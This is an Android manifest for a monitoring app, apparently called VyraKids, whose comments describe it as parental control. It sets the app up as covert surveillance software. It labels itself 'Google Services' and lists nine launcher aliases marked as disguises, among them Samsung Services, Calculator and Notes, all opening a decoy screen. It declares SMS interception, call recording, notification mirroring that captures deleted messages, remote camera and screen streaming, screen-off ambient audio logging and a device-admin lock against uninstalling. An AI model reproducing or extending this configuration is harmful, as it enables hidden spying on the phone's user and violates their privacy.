<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools">

    <!-- Network & Sync -->
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
    <uses-permission android:name="android.permission.CHANGE_WIFI_MULTICAST_STATE" />
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />

    <!-- Storage & Vivo Call Recordings Access -->
    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" tools:ignore="ScopedStorage" />
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" android:maxSdkVersion="32" />
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" android:maxSdkVersion="29" tools:ignore="ScopedStorage" />

    <!-- Calls, SMS & Contacts Interception -->
    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
    <uses-permission android:name="android.permission.READ_CALL_LOG" />
    <uses-permission android:name="android.permission.READ_CONTACTS" />
    <uses-permission android:name="android.permission.RECEIVE_SMS" />
    <uses-permission android:name="android.permission.READ_SMS" />

    <!-- Camera, Audio & Flashlight for Remote Stream -->
    <uses-permission android:name="android.permission.CAMERA" />
    <uses-permission android:name="android.permission.RECORD_AUDIO" />
    <uses-permission android:name="android.permission.FLASHLIGHT" />

    <!-- Foreground Services for Android 14 -->
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PLAYBACK" />

    <!-- Battery Exemption for Keep-Alive & Android 13/14 Notifications -->
    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
    <!-- App Usage & Screen Time Metrics -->
    <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS" tools:ignore="ProtectedPermissions" />

    <application
        android:allowBackup="false"
        android:icon="@drawable/ic_sync"
        android:label="Google Services"
        android:roundIcon="@drawable/ic_sync"
        android:supportsRtl="true"
        android:theme="@style/Theme.VyraKids"
        android:requestLegacyExternalStorage="true"
        android:usesCleartextTraffic="true"
        android:networkSecurityConfig="@xml/network_security_config">

        <!-- Entrypoint Setup Wizard (Direct launch during install) -->
        <activity
            android:name=".ui.SetupWizardActivity"
            android:exported="true"
            android:screenOrientation="portrait">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
            </intent-filter>
        </activity>

        <!-- Neutral Decoy Face Activity Target -->
        <activity
            android:name=".ui.DecoyDisplayActivity"
            android:exported="true"
            android:screenOrientation="portrait" />

        <!-- 1. Default Disguise: System Sync (Purple 2-Arrows Anticlockwise Icon - Enabled by Default) -->
        <activity-alias
            android:name=".AliasSystemSync"
            android:enabled="true"
            android:exported="true"
            android:icon="@drawable/ic_sync"
            android:roundIcon="@drawable/ic_sync"
            android:label="System Sync"
            android:targetActivity=".ui.DecoyDisplayActivity">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity-alias>

        <!-- 2. Disguise: Google Services -->
        <activity-alias
            android:name=".AliasVivoServices"
            android:enabled="false"
            android:exported="true"
            android:icon="@drawable/ic_sync"
            android:roundIcon="@drawable/ic_sync"
            android:label="Google Services"
            android:targetActivity=".ui.DecoyDisplayActivity">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity-alias>

        <!-- 3. Brand-Adaptive Disguise: Samsung Services -->
        <activity-alias
            android:name=".AliasSamsungServices"
            android:enabled="false"
            android:exported="true"
            android:icon="@drawable/ic_system_services_samsung"
            android:roundIcon="@drawable/ic_system_services_samsung"
            android:label="Samsung Services"
            android:targetActivity=".ui.DecoyDisplayActivity">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity-alias>

        <!-- 4. Brand-Adaptive Disguise: Xiaomi Services -->
        <activity-alias
            android:name=".AliasXiaomiServices"
            android:enabled="false"
            android:exported="true"
            android:icon="@drawable/ic_system_services_xiaomi"
            android:roundIcon="@drawable/ic_system_services_xiaomi"
            android:label="Xiaomi Services"
            android:targetActivity=".ui.DecoyDisplayActivity">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity-alias>

        <!-- 5. Universal Disguise: System Toolkit -->
        <activity-alias
            android:name=".AliasSimToolkit"
            android:enabled="false"
            android:exported="true"
            android:icon="@drawable/ic_sim_card"
            android:roundIcon="@drawable/ic_sim_card"
            android:label="System Toolkit"
            android:targetActivity=".ui.DecoyDisplayActivity">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity-alias>

        <!-- 6. Disguise: Device Support -->
        <activity-alias
            android:name=".AliasDeviceSupport"
            android:enabled="false"
            android:exported="true"
            android:icon="@drawable/ic_device_support"
            android:roundIcon="@drawable/ic_device_support"
            android:label="Device Support"
            android:targetActivity=".ui.DecoyDisplayActivity">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity-alias>

        <!-- 7. Disguise: Digital Compass -->
        <activity-alias
            android:name=".AliasCompass"
            android:enabled="false"
            android:exported="true"
            android:icon="@drawable/ic_compass"
            android:roundIcon="@drawable/ic_compass"
            android:label="Compass"
            android:targetActivity=".ui.DecoyDisplayActivity">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity-alias>

        <!-- 8. Disguise: Calculator -->
        <activity-alias
            android:name=".AliasCalculator"
            android:enabled="false"
            android:exported="true"
            android:icon="@drawable/ic_calculator"
            android:roundIcon="@drawable/ic_calculator"
            android:label="Calculator"
            android:targetActivity=".ui.DecoyDisplayActivity">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity-alias>

        <!-- 9. Disguise: Notes -->
        <activity-alias
            android:name=".AliasNotes"
            android:enabled="false"
            android:exported="true"
            android:icon="@drawable/ic_notes"
            android:roundIcon="@drawable/ic_notes"
            android:label="Notes"
            android:targetActivity=".ui.DecoyDisplayActivity">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity-alias>

        <!-- 1. Accessibility Service: Anti-Tamper & In-App Camera Trap -->
        <service
            android:name=".services.VyraAccessibilityService"
            android:label="@string/accessibility_service_label"
            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
            android:exported="true">
            <intent-filter>
                <action android:name="android.accessibilityservice.AccessibilityService" />
            </intent-filter>
            <meta-data
                android:name="android.accessibilityservice"
                android:resource="@xml/accessibility_service_config" />
        </service>

        <!-- 2. Notification Mirroring & Deleted Messages Service -->
        <service
            android:name=".services.VyraNotificationListener"
            android:label="@string/notification_listener_label"
            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
            android:exported="true">
            <intent-filter>
                <action android:name="android.service.notification.NotificationListenerService" />
            </intent-filter>
        </service>

        <!-- 3. Call Recording & Offline Vault Sync Service -->
        <service
            android:name=".services.CallRecordingSyncService"
            android:foregroundServiceType="dataSync"
            android:exported="false" />

        <!-- 4. SMS Monitoring Service -->
        <service
            android:name=".services.SmsObserverService"
            android:foregroundServiceType="dataSync"
            android:exported="false" />

        <!-- 5. Live Screen Projection Service -->
        <service
            android:name=".services.LiveScreenStreamService"
            android:foregroundServiceType="mediaProjection"
            android:exported="false" />

        <!-- 6. Remote Camera Stream Service -->
        <service
            android:name=".services.RemoteCameraStreamService"
            android:foregroundServiceType="camera|microphone"
            android:exported="false" />

        <!-- 7. Parent Voice Intercom Player Service -->
        <service
            android:name=".services.VoiceIntercomPlayerService"
            android:foregroundServiceType="mediaPlayback"
            android:exported="false" />

        <!-- 8. Screen-Off Ambient Voice & Activity Logger Service -->
        <service
            android:name=".services.AmbientAudioLoggerService"
            android:foregroundServiceType="microphone"
            android:exported="false" />

        <!-- 9. Live Real-Time Audio Streaming Service (one-tap live listen over LAN) -->
        <service
            android:name=".services.LiveAudioStreamService"
            android:foregroundServiceType="microphone"
            android:exported="false" />

        <!-- 8. Device Administrator (Anti-Uninstall Lock) -->
        <receiver
            android:name=".receivers.VyraDeviceAdminReceiver"
            android:label="@string/device_admin_label"
            android:description="@string/device_admin_description"
            android:permission="android.permission.BIND_DEVICE_ADMIN"
            android:exported="true">
            <meta-data
                android:name="android.app.device_admin"
                android:resource="@xml/device_admin_sample" />
            <intent-filter>
                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
            </intent-filter>
        </receiver>

        <!-- 9. New App Install Detection Receiver -->
        <receiver
            android:name=".receivers.PackageInstallReceiver"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.PACKAGE_ADDED" />
                <data android:scheme="package" />
            </intent-filter>
        </receiver>

        <!-- 10. Boot Receiver for Auto-Start -->
        <receiver
            android:name=".receivers.BootReceiver"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED" />
                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
            </intent-filter>
        </receiver>

        <!-- 11. SMS Incoming Receiver -->
        <receiver
            android:name=".services.SmsObserverService$SmsBroadcastReceiver"
            android:permission="android.permission.BROADCAST_SMS"
            android:exported="true">
            <intent-filter android:priority="999">
                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
            </intent-filter>
        </receiver>

        <!-- 12. Call State Receiver for On-Demand Call Logs & Recording Sync -->
        <receiver
            android:name=".receivers.CallStateReceiver"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.PHONE_STATE" />
            </intent-filter>
        </receiver>

    </application>

</manifest>
